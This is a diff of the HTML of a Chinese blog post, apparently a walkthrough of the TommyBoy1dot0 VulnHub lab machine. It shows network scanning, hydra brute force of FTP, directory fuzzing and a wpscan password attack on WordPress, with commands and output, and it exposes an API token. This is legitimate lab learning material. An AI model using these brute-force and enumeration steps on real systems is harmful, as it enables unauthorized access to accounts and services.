@@ -85,7 +85,7 @@
 <meta property="og:image" content="http://ww1.sinaimg.cn/large/006gDuOdgy1gc151tfb4uj30po04kdhs.jpg">
 <meta property="article:published_time" content="2020-02-18T09:59:29.000Z">
 <meta property="article:modified_time" content="2021-08-06T03:58:07.817Z">
-<meta property="article:author" content="Dana Shaw">
+<meta property="article:author" content="肖坤稼">
 <meta property="article:tag" content="vulnhub靶机练习">
 <meta property="article:tag" content="TommyBoy1dot0">
 <meta name="twitter:card" content="summary">
@@ -162,7 +162,8 @@
         <span class="logo-line-after"><i></i></span>
       </a>
     </div>
-        <p class="site-subtitle">为了去往别处</p>
+        <h1 class="site-subtitle" itemprop="description">为了去往别处</h1>
+      
   </div>
 
   <div class="site-nav-toggle">
@@ -237,9 +238,7 @@
     <i class="fa fa-search"></i>
   </span>
   <div class="search-input-container">
-    <input autocomplete="off" autocorrect="off" autocapitalize="none"
-           placeholder="搜索..." spellcheck="false"
-           type="text" id="search-input">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="搜索..." spellcheck="false" type="text" id="search-input">
   </div>
   <span class="popup-btn-close">
     <i class="fa fa-times-circle"></i>
@@ -279,7 +278,7 @@
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/./images/photo.jpg">
-      <meta itemprop="name" content="Dana Shaw">
+      <meta itemprop="name" content="肖坤稼">
       <meta itemprop="description" content="连尘埃也想收藏">
     </span>
 
@@ -287,9 +286,9 @@
       <meta itemprop="name" content="Dana Shaw's blog">
     </span>
       <header class="post-header">
-        <h1 class="post-title" itemprop="name headline">
+        <h2 class="post-title" itemprop="name headline">
           vulnhub靶机练习之TommyBoy1dot0
-        </h1>
+        </h2>
 
         <div class="post-meta">
             <span class="post-meta-item">
@@ -358,7 +357,7 @@
 <li>使用<code>arp-scan -l</code>探测靶机IP，我们发现靶机的IP是192.168.80.13。<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# arp-scan -l</span><br><span class="line">Interface: eth0, datalink type: EN10MB (Ethernet)</span><br><span class="line">Starting arp-scan 1.9.5 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.80.1	00:50:56:c0:00:08	VMware, Inc.</span><br><span class="line">192.168.80.2	00:50:56:fc:96:a7	VMware, Inc.</span><br><span class="line">192.168.80.13	00:0c:29:36:78:84	VMware, Inc.</span><br><span class="line">192.168.80.254	00:50:56:fa:63:60	VMware, Inc.</span><br><span class="line"></span><br><span class="line">4 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.5: 256 hosts scanned in 1.962 seconds (130.48 hosts/sec). 4 responded</span><br></pre></td></tr></table></figure></li>
 <li>使用<code>masscan</code>探测开启的端口信息<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# masscan -p1-65535 192.168.80.13/32 --rate=10000                 </span><br><span class="line"></span><br><span class="line">Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-02-18 10:52:45 GMT</span><br><span class="line"> -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth</span><br><span class="line">Initiating SYN Stealth Scan</span><br><span class="line">Scanning 1 hosts [65535 ports/host]</span><br><span class="line">Discovered open port 22/tcp on 192.168.80.13                                   </span><br><span class="line">Discovered open port 80/tcp on 192.168.80.13                                   </span><br><span class="line">Discovered open port 8008/tcp on 192.168.80.13  </span><br></pre></td></tr></table></figure></li>
 <li>接下来使用<code>nmap</code>深度扫描，发现端口对应的服务是<code>22端口：ssh</code>、<code>80和8008端口：http</code>。<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# nmap 192.168.80.13 -p22,80,8008</span><br><span class="line">Starting Nmap 7.70 ( https://nmap.org ) at 2020-02-18 19:00 CST</span><br><span class="line">Nmap scan report for 192.168.80.13</span><br><span class="line">Host is up (0.00045s latency).</span><br><span class="line"></span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line">22/tcp   open  ssh</span><br><span class="line">80/tcp   open  http</span><br><span class="line">8008/tcp open  http</span><br><span class="line">MAC Address: 00:0C:29:36:78:84 (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 0.18 seconds</span><br></pre></td></tr></table></figure></li>
-<li>使用<code>nikto</code>扫描web漏洞<br>nikto是什么？<a target="_blank" rel="noopener" href="https://blog.bbskali.cn/index.php/archives/304/">参考资料</a><blockquote>
+<li>使用<code>nikto</code>扫描web漏洞<br>nikto是什么？<a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.bbskali.cn/index.php/archives/304/">参考资料</a><blockquote>
 <p>NIKTO:perl语言开发的开源WEB安全扫描器；识别网站软件版本；搜索存在安全隐患的文件；检查服务器配置漏洞；检查WEB Application层面的安全隐患；避免404误判依据响应文件内容判断，不同扩展名的文件404响应内容不同。</p>
 </blockquote>
 </li>
@@ -368,7 +367,7 @@
 </ul>
 <p>命令用法：<br><code>nikto -host 192.168.80.13 -port 80</code></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">+ Entry &#x27;/lukeiamyourfather/&#x27; in robots.txt returned a non-forbidden or redirect HTTP code (200)</span><br><span class="line">+ OSVDB-3268: /lookalivelowbridge/: Directory indexing found.</span><br><span class="line">+ Entry &#x27;/lookalivelowbridge/&#x27; in robots.txt returned a non-forbidden or redirect HTTP code (200)</span><br><span class="line">+ Entry &#x27;/flag-numero-uno.txt&#x27; in robots.txt returned a non-forbidden or redirect HTTP code (200)</span><br><span class="line">+ &quot;robots.txt&quot; contains 4 entries which should be manually viewed.</span><br><span class="line">+ Apache/2.4.18 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.</span><br><span class="line">+ OSVDB-630: The web server may reveal its internal or real IP in the Location header via a request to /aspnet_client over HTTP/1.0. The value is &quot;127.0.1.1&quot;.</span><br><span class="line">+ Server may leak inodes via ETags, header found with file /, inode: 498, size: 5371fb88ff1d8, mtime: gzip</span><br><span class="line">+ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD </span><br></pre></td></tr></table></figure>
-<p>从输出结果中找到以上关键信息，发现网站存在这个入口<code>/flag-numero-uno.txt</code>，于是到浏览器输入url地址：<code>http://192.168.80.13/flag-numero-uno.txt</code>获取到第一个flag：<code>Flag data: B34rcl4ws</code>。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc0rs42a3vj30zi0nnt9u.jpg" alt="image.png"><br>6. 查看网页源码，找到关键信息，blog<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc0s6a34wrj30zo0lsacv.jpg" alt="image.png"><br>要找到公司博客，得先看一个youtube视频：<code>https://www.youtube.com/watch?v=VUxOd4CszJ8</code>。这个视频就一句话「Hey, prestoricforest」，猜测这个公司博客的url地址是<code>http://192.168.80.13/prehistoricforest/</code><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc0sgkznalj30zs0nzjus.jpg" alt="image.png"><br>7. 进入博客，我们发现第一篇博客的回复里面有flag提示信息：<code>Flag #2: thisisthesecondflagyayyou.txt</code><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc0sl4bxalj31f60quq82.jpg" alt="image.png"><br>于是我们通过提示，输入url：<code>http://192.168.80.13/prehistoricforest/thisisthesecondflagyayyou.txt</code>得到第二个flag：<code>Flag data: Z4l1nsky</code><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc0sp6d4gej31f60q6tbj.jpg" alt="image.png"><br>8. 进入<code>son of A</code>这篇博客，找到新的信息提示<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc0srpwch7j31f60u0gs8.jpg" alt="image.png"><br>提示1：带锁的那篇博客的密码在这个目录：<code>http://192.168.80.13/richard</code>里面找。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc0stsaln1j31f60u0n22.jpg" alt="image.png"><br>把这张图片下载到本地，exif这张图片，获得一串md5代码：<code>ce154b5a8e59c89732bc25d6a2e6b90b</code>。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc0t2a9otzj30xz0gvwlk.jpg" alt="image.png"><br>使用<a target="_blank" rel="noopener" href="https://www.cmd5.com/">在线工具</a>解密这串md5，得到的结果是：<code>spanky</code>，这就是那篇加密博客的访问密码了。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc0t4kn702j31f60u0juz.jpg" alt="image.png"><br>使用密码访问这篇博客。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc0t60viqhj31f60u0jxd.jpg" alt="image.png"><br>用hydra对ftp账号<code>nickburns</code>做暴力破解，获取到密码：<code>nickburns</code>。–但是我并没扫描出65534端口:/<br>原来是这个端口的服务不稳定，时断时开。</p>
+<p>从输出结果中找到以上关键信息，发现网站存在这个入口<code>/flag-numero-uno.txt</code>，于是到浏览器输入url地址：<code>http://192.168.80.13/flag-numero-uno.txt</code>获取到第一个flag：<code>Flag data: B34rcl4ws</code>。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc0rs42a3vj30zi0nnt9u.jpg" alt="image.png"><br>6. 查看网页源码，找到关键信息，blog<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc0s6a34wrj30zo0lsacv.jpg" alt="image.png"><br>要找到公司博客，得先看一个youtube视频：<code>https://www.youtube.com/watch?v=VUxOd4CszJ8</code>。这个视频就一句话「Hey, prestoricforest」，猜测这个公司博客的url地址是<code>http://192.168.80.13/prehistoricforest/</code><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc0sgkznalj30zs0nzjus.jpg" alt="image.png"><br>7. 进入博客，我们发现第一篇博客的回复里面有flag提示信息：<code>Flag #2: thisisthesecondflagyayyou.txt</code><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc0sl4bxalj31f60quq82.jpg" alt="image.png"><br>于是我们通过提示，输入url：<code>http://192.168.80.13/prehistoricforest/thisisthesecondflagyayyou.txt</code>得到第二个flag：<code>Flag data: Z4l1nsky</code><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc0sp6d4gej31f60q6tbj.jpg" alt="image.png"><br>8. 进入<code>son of A</code>这篇博客，找到新的信息提示<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc0srpwch7j31f60u0gs8.jpg" alt="image.png"><br>提示1：带锁的那篇博客的密码在这个目录：<code>http://192.168.80.13/richard</code>里面找。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc0stsaln1j31f60u0n22.jpg" alt="image.png"><br>把这张图片下载到本地，exif这张图片，获得一串md5代码：<code>ce154b5a8e59c89732bc25d6a2e6b90b</code>。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc0t2a9otzj30xz0gvwlk.jpg" alt="image.png"><br>使用<a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.cmd5.com/">在线工具</a>解密这串md5，得到的结果是：<code>spanky</code>，这就是那篇加密博客的访问密码了。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc0t4kn702j31f60u0juz.jpg" alt="image.png"><br>使用密码访问这篇博客。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc0t60viqhj31f60u0jxd.jpg" alt="image.png"><br>用hydra对ftp账号<code>nickburns</code>做暴力破解，获取到密码：<code>nickburns</code>。–但是我并没扫描出65534端口:/<br>原来是这个端口的服务不稳定，时断时开。</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# hydra -e nsr -l nickburns ftp://192.168.80.13:65534/</span><br><span class="line">Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-02-18 20:13:54</span><br><span class="line">[DATA] max 3 tasks per 1 server, overall 3 tasks, 3 login tries (l:1/p:3), ~1 try per task</span><br><span class="line">[DATA] attacking ftp://192.168.80.13:65534/</span><br><span class="line">[65534][ftp] host: 192.168.80.13   login: nickburns   password: nickburns</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-02-18 20:13:57</span><br></pre></td></tr></table></figure>
 <p>输入用户名和密码登录ftp服务：</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# ftp 192.168.80.13 65534</span><br><span class="line">Connected to 192.168.80.13.</span><br><span class="line">220 Callahan_FTP_Server 1.3.5</span><br><span class="line">Name (192.168.80.13:root): nickburns</span><br><span class="line">331 Password required for nickburns</span><br><span class="line">Password:</span><br><span class="line">230 User nickburns logged in</span><br><span class="line">Remote system type is UNIX.</span><br><span class="line">Using binary mode to transfer files.</span><br><span class="line"><span class="meta">ftp&gt;</span><span class="bash"> </span></span><br></pre></td></tr></table></figure>
@@ -378,9 +377,9 @@
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# cat readme.txt </span><br><span class="line">To my replacement:</span><br><span class="line"></span><br><span class="line">If you&#x27;re reading this, you have the unfortunate job of taking over IT responsibilities</span><br><span class="line">from me here at Callahan Auto.  HAHAHAHAHAAH! SUCKER!  This is the worst job ever!  You&#x27;ll be</span><br><span class="line">surrounded by stupid monkeys all day who can barely hit Ctrl+P and wouldn&#x27;t know a fax machine</span><br><span class="line">from a flame thrower!</span><br><span class="line"></span><br><span class="line">Anyway I&#x27;m not completely without mercy.  There&#x27;s a subfolder called &quot;NickIzL33t&quot; on this server</span><br><span class="line">somewhere. I used it as my personal dropbox on the company&#x27;s dime for years.  Heh. LOL.</span><br><span class="line">I cleaned it out (no naughty pix for you!) but if you need a place to dump stuff that you want</span><br><span class="line">to look at on your phone later, consider that folder my gift to you.</span><br><span class="line"></span><br><span class="line">Oh by the way, Big Tom&#x27;s a moron and always forgets his passwords and so I made an encrypted</span><br><span class="line">.zip of his passwords and put them in the &quot;NickIzL33t&quot; folder as well.  But guess what?</span><br><span class="line">He always forgets THAT password as well.  Luckily I&#x27;m a nice guy and left him a hint sheet.</span><br><span class="line"></span><br><span class="line">Good luck, schmuck!</span><br><span class="line"></span><br><span class="line">LOL.</span><br><span class="line"></span><br><span class="line">-Nick</span><br></pre></td></tr></table></figure>
 <p>于是我们访问这个url：<code>http://192.168.80.13:8008/NickIzL33t</code>，看到这样的结果。<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc106lvx3ej30zh0nljst.jpg" alt="image.png"><br>当我们使用插件<code>User-Agent Switcher and Manager</code>修改UA为IOS时，页面显示结果变成这样：<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc15ltgo9fj30zu0nlmyp.jpg" alt="image.png"><br>这是在提示我们要获取这个网站的密码，要找到一个html文件。于是我们爆破目录，去寻找相关的html。<br>思路1：使用burpsuite爆破<br>payload：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /NickIzL33t/§page§.html HTTP/1.1</span><br><span class="line">Host: 192.168.1.15:8008</span><br><span class="line">User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 5_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B176 Safari/7534.48.3</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">If-Modified-Since: Fri, 15 Jul 2016 02:11:27 GMT</span><br><span class="line">If-None-Match: &quot;10e-537a322dc0ba6-gzip&quot;</span><br><span class="line">Cache-Control: max-age=0</span><br></pre></td></tr></table></figure>
-<p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc37oafa7yj31ee0cuwg3.jpg" alt="image.png"><br>思路2：使用DirBuster爆破<br><a target="_blank" rel="noopener" href="https://blog.csdn.net/l1028386804/article/details/85757875">DirBuster用法</a><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc47r97molj30lj0f0gmw.jpg" alt="image.png"><br>思路3：使用dirb爆破（没成功）</p>
+<p><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc37oafa7yj31ee0cuwg3.jpg" alt="image.png"><br>思路2：使用DirBuster爆破<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://blog.csdn.net/l1028386804/article/details/85757875">DirBuster用法</a><br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc47r97molj30lj0f0gmw.jpg" alt="image.png"><br>思路3：使用dirb爆破（没成功）</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirb http://192.168.80.13:8008/NickIzL33t/ /usr/share/wordlists/rockyou.txt -a &quot;Mozilla/5.0 (iPhone; CPU iPhone OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25&quot; -X .html</span><br></pre></td></tr></table></figure>
-<p>思路4：使用wfuzz爆破<br><a target="_blank" rel="noopener" href="https://www.icekam.com/post/wfuzz-web-blasting-and-exhaustive-tools/">wfuzz常见用法</a></p>
+<p>思路4：使用wfuzz爆破<br><a target="_blank" rel="external nofollow noopener noreferrer" href="https://www.icekam.com/post/wfuzz-web-blasting-and-exhaustive-tools/">wfuzz常见用法</a></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -Z -c -v -w /usr/share/wordlists/rockyou.txt -H &quot;User-Agent:Mozilla/5.0 (iPhone; U; CPU iPhone OS 3_0 like Mac OS X; en-us) AppleWebKit/528.18 (KHTML, like Gecko) Version/4.0 Mobile/7A341 Safari/528.16&quot; --hc 404 http://192.168.80.13:8008/NickIzL33t/FUZZ.html </span><br></pre></td></tr></table></figure>
 <p>字典文件存在空格导致程序报错😭😭😭😭😭😭太难受了……<br><img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc3995ulb6j30on0ixq6o.jpg" alt="image.png"></p>
 <p>使用crunch生成密码字典：</p>
@@ -391,7 +390,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">[+] Enumerating Users (via Passive and Aggressive Methods)</span><br><span class="line"> Brute Forcing Author IDs - Time: 00:00:01 &lt;===================================================================================================================================================&gt; (10 / 10) 100.00% Time: 00:00:01</span><br><span class="line"></span><br><span class="line">[i] User(s) Identified:</span><br><span class="line"></span><br><span class="line">[+] tommy</span><br><span class="line"> | Found By: Author Posts - Author Pattern (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] richard</span><br><span class="line"> | Found By: Author Posts - Author Pattern (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Rss Generator (Passive Detection)</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] tom</span><br><span class="line"> | Found By: Author Posts - Author Pattern (Passive Detection)</span><br><span class="line"> | Confirmed By:</span><br><span class="line"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> |  Login Error Messages (Aggressive Detection)</span><br><span class="line"></span><br><span class="line">[+] Tom Jr.</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"></span><br><span class="line">[+] Big Tom</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"></span><br><span class="line">[+] michelle</span><br><span class="line"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span><br><span class="line"> | Confirmed By: Login Error Messages (Aggressive Detection)</span><br></pre></td></tr></table></figure>
 <p> 解压rockyou.txt.gz这个压缩包，使用该字典进行暴力破解。<br> <code>kali@kali:/usr/share/wordlists$ sudo gzip -d rockyou.txt.gz</code>，注意这里要使用<code>sudo</code>权限。<br> <img src="http://ww1.sinaimg.cn/large/006gDuOdgy1gc151tfb4uj30po04kdhs.jpg" alt="image.png"></p>
 <p> <del>暴力破解待续……</del></p>
-<p>继续使用<code>wpscan</code>暴力破解wordpress登录密码。太不容易了，找了好久才找到wpscan3.0以上版本的使用方法，<a target="_blank" rel="noopener" href="https://soapffz.com/16.html">参考文章</a>。爆破tom的密码，爆出的密码是：<code>tomtom1</code>。<strong>可能没有人像我这样花两天时间爆破这么一个简单的密码😥</strong></p>
+<p>继续使用<code>wpscan</code>暴力破解wordpress登录密码。太不容易了，找了好久才找到wpscan3.0以上版本的使用方法，<a target="_blank" rel="external nofollow noopener noreferrer" href="https://soapffz.com/16.html">参考文章</a>。爆破tom的密码，爆出的密码是：<code>tomtom1</code>。<strong>可能没有人像我这样花两天时间爆破这么一个简单的密码😥</strong></p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~$ sudo wpscan --url http://192.168.80.13/prehistoricforest/ --usernames tom --passwords /usr/share/wordlists/rockyou.txt --api-token XLupJiXSlrJM4j1tUKggDoVYGzR7VqB9fsevFf9sfn0 --max-threads 100</span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#x27;_ \</span><br><span class="line">            \  /\  /  | |     ____) | (__| (_| | | | |</span><br><span class="line">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span><br><span class="line"></span><br><span class="line">         WordPress Security Scanner by the WPScan Team</span><br><span class="line">                         Version 3.7.6</span><br><span class="line">                               </span><br><span class="line">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="line">_______________________________________________________________</span><br><span class="line"></span><br><span class="line">[i] Updating the Database ...</span><br><span class="line">[i] Update completed.</span><br><span class="line"></span><br><span class="line">[+] URL: http://192.168.80.13/prehistoricforest/</span><br><span class="line">[+] Started: Thu Feb 20 03:29:20 2020</span><br><span class="line"></span><br><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[+] http://192.168.80.13/prehistoricforest/</span><br><span class="line"> | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] http://192.168.80.13/prehistoricforest/xmlrpc.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | References:</span><br><span class="line"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access</span><br><span class="line"></span><br><span class="line">[+] http://192.168.80.13/prehistoricforest/readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] http://192.168.80.13/prehistoricforest/wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="line"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="line"></span><br><span class="line">[+] WordPress version 4.5.20 identified (Latest, released on 2019-12-12).</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> |  - http://192.168.80.13/prehistoricforest/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=4.5.20&lt;/generator&gt;</span><br><span class="line"> |  - http://192.168.80.13/prehistoricforest/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=4.5.20&lt;/generator&gt;</span><br><span class="line"></span><br><span class="line">[+] WordPress theme in use: twentysixteen</span><br><span class="line"> | Location: 